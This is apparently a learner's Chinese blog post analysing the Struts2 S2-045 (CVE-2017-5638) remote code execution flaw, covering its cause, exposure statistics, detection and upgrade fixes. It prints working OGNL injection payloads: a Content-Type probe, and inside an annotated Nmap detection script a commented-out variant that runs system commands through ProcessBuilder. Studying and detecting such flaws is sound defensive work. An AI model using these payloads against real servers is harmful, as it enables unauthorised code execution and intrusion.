---
date: 2025-06-16
---

# 博客文章分析-Struts2 S2-045漏洞态势分析报告

S2-045 是 Apache Struts 2 框架中一个极为严重的远程代码执行漏洞（编号：CVE-2017-5638）

OK，一上来就碰到新名词了，先去搜搜这些个新名词的资料。

# 新名词

## Struts2

第一次见这个框架

Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。

## **Jakarta Multipart parser**

Jakarta Multipart parser 是 Apache Struts2 框架中用于处理文件上传的组件。

当 HTML 表单需要上传文件时，必须使用 `multipart/form-data` 格式。这种格式会将表单数据和文件内容分成多个部分（parts），每个部分都有独立的 MIME 类型和边界分隔符。

## OGNL表达式处理

OGNL（Object Graph Navigation Language）是一种功能强大的表达式语言，常用于 Java 应用程序中访问和操作对象图。它在 Struts 2 等框架中被广泛使用，允许开发者通过表达式动态获取或设置对象属性、调用方法等。

# 漏洞原理

该漏洞源于 Jakarta Multipart 解析器对上传文件的处理不当，攻击者可通过构造特制的 Content-Type 头部触发 OGNL 表达式注入，进而执行任意系统命令。

S2-045 漏洞利用了 Jakarta Multipart 解析器在处理上传文件时的缺陷。当 Content-Type 值包含特殊字符（如`%{}`）时，框架会错误地将其解析为 OGNL 表达式并执行。

# 国内影响

灯塔实验室监测结果发现超过9000多套系统存在S2-045远程代码执行漏洞。其中受影响系统超过50套的省市超过了26个。在他们监测的100多个常用HTTP服务端口中，其中受漏洞影响系统超过50套的端口有24个。此外对其受影响IP地址的运营商进行分析时，发现托放于阿里云的系统数量超过了2500套，还有及少一部分托放于腾讯云的系统。

还是有相当一部分人的网络安全意识很淡薄，常用端口一定要保护好，至于对运营商进行的分析，我认为大部分时候云服务运营商都只是买服务器资源，至于被ddos攻击或者是自己把系统玩崩了跟云服务运营商一般来说是没啥关系的，当然了，我只是站在我一个散户的角度上来看，而且这种软件层面的漏洞也不是云服务厂商能管的了得了。

# 对**工控系统或工控企业的影响**

在一般情况下工控企业位于上层的信息管理系统，例如：ERP、OA、生产运行管理等系统可能使用J2EE Struts2框架开发，这些系统往往会直接暴露和发布在公网环境中，攻击者可以通过该漏洞远程执行代码，并获得主机权限，这样将导致攻击者可以利用上层信息系统，通过跳板渗透等手段，影响内网工控系统安全。灯塔实验室确认了S2-045漏洞已影响线上某些风电、供热等运行管理系统，以及一些重点和知名工控企业的信息管理系统。

也就是说这个漏洞是确实危害到生产环境的，所以说不容小觑，各大工控企业应该及时整改升级

# 检测方法

## 本地检查

用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。

## **远程检查**

在向服务器发出的http请求报文中，修改Content-Type字段：

Content-Type:%{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘vul’,’vul’)}.multipart/form-data，如返回response报文中存在vul：vul字段项则表明存在漏洞。

这块就是利用**Jakarta Multipart parser**解析器漏洞，构造包含 OGNL 表达式 的恶意 Content-Type 触发远程代码执行。若漏洞存在，服务器会执行 OGNL 表达式，并在响应头中添加`vul: vul`。

## 脚本工具检查

使用灯塔实验室提供的基于Nmap的NSE检测脚本用于快速发现S2-045漏洞，那就来分析一下这个脚本

```lua
-- =============================================
-- Struts2 S2-045漏洞检测Nmap脚本
-- 功能：检测Struts2框架是否存在S2-045漏洞（CVE-2017-5638）
-- =============================================

-- 脚本基本信息定义
description = [[
Struts2 S2-045 Checks
]]

-- Nmap命令示例（可用于执行扫描）
-- nmap -script struts2-scan -sS -p 80,8080,81,82,83,84,85,86,87,88,8888,8088 -n -d ip -oX outscan.xml

-- 参考链接与版权声明
-- BeaconLab https://plcscan.org/blog/
categories = {"discovery", "safe"}  -- 脚本分类：发现类、安全类
author = "Z-0ne"  -- 作者信息
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"  -- 许可证声明

-- 导入所需的NSE库
local http = require "http"       -- HTTP请求处理库
local target = require "target"   -- 目标主机处理库
local shortport = require "shortport"  -- 端口处理库
local stdnse = require "stdnse"   -- 标准NSE工具库
local table = require "table"     -- 表格处理库

-- =============================================
-- 端口扫描规则定义
-- 功能：指定脚本仅对状态为"open"的端口进行检测
-- =============================================
portrule = function(host, port)
  return port.state == "open"  -- 仅扫描开放的端口
end

-- =============================================
-- 核心检测逻辑
-- 功能：发送检测请求、分析响应并判断漏洞是否存在
-- =============================================
action = function(host, port)
  local output = stdnse.output_table()  -- 创建输出结果表
  local options                        -- HTTP请求选项
  
  -- 核心检测Payload（OGNL表达式）
  -- 功能：通过OGNL表达式向响应中写入特征字符串，验证漏洞存在性
  local payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('Struts2S2045Checks!!!')).(#o.close())}"
  
  -- 备用Payload（可用于执行系统命令，默认注释）
  -- local payload_cmd = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
  
  local useragent = "Mozilla/5.0"  -- 设置User-Agent模拟浏览器请求
  
  -- 配置HTTP请求选项
  options = {header = {}, timeout = 15000}  -- 初始化选项（请求头、超时时间15秒）
  options["header"]["Content-type"] = payload  -- 设置恶意Content-Type（包含OGNL表达式）
  options["header"]["User-Agent"] = useragent  -- 设置User-Agent
  
  -- 发送HTTP GET请求到目标主机的根路径
  local response = http.get(host, port, "/", options)
  
  -- =============================================
  -- 处理HTTP 200响应（正常响应）
  -- =============================================
  if response.status == 200 then
    -- 检查响应体是否包含漏洞特征字符串
    if string.find(response.body, "Struts2S2045Checks") ~= nil then
      -- 排除phpinfo页面干扰（避免PHP环境误判）
      if string.find(response.body, "phpinfo") == nil then
        -- 根据响应长度判断漏洞状态（处理不同环境的换行符差异）
        -- 响应长度21：纯文本输出（无换行符）
        if #response.body == 21 then
          output["status"] = "S2-045-AChecks vuln21"
          return output
        -- 响应长度22：包含\n换行符
        elseif #response.body == 22 then
          output["status"] = "S2-045-AChecks vuln22"
          return output
        -- 响应长度23：包含\r\n换行符
        elseif #response.body == 23 then
          output["status"] = "S2-045-AChecks vuln23"
          return output
        -- 响应长度小于50：可能为正常漏洞响应
        elseif #response.body < 50 then
          output["status"] = "S2-045-AChecks"
          output["resplength"] = #response.body  -- 记录响应长度
          return output
        -- 响应长度过大：可能为误报
        else
          output["status"] = "S2-045-AChecks lengtherror"
          output["resplength"] = #response.body  -- 记录异常长度
          return output
        end
      end
    end
  end
  
  -- =============================================
  -- 处理HTTP 302重定向响应
  -- =============================================
  if response.status == 302 then
    if response.location then
      -- 解析重定向URL（获取主机和路径）
      local parseurl = http.parse_url(response.location[#response.location])
      -- 发送新请求到重定向后的地址（保持原请求头）
      local response = http.get(parseurl.host, port, parseurl.path, options)
      
      -- 重定向后的响应处理（与正常响应逻辑相同）
      if response.status == 200 then
        if string.find(response.body, "Struts2S2045Checks") ~= nil then
          if string.find(response.body, "phpinfo") == nil then
            if #response.body == 21 then
              output["status"] = "S2-045-BChecks vuln21"
              return output
            elseif #response.body == 22 then
              output["status"] = "S2-045-BChecks vuln22"
              return output
            elseif #response.body == 23 then
              output["status"] = "S2-045-BChecks vuln23"
              return output
            elseif #response.body < 50 then
              output["status"] = "S2-045-BChecks"
              output["resplength"] = #response.body
              return output
            else
              output["status"] = "S2-045-BChecks lengtherror"
              output["resplength"] = #response.body
              return output
            end
          end
        end
      end
    end
  end
  
  -- =============================================
  -- 调试功能（默认注释，可取消注释用于问题排查）
  -- =============================================
  -- if response.status == 404 and response.body then
  --   output["status"] = "S2-045-CChecks"
  --   output["res"] = response.body
  --   return output
  -- end
end
```

# 修复

受影响用户可升级版本至Apache Struts 2.3.32 或 Apache Struts 2.5.10.1以消除漏洞影响。

不方便升级那就直接删除commons-fileupload-x.x.x.jar文件，别上传文件了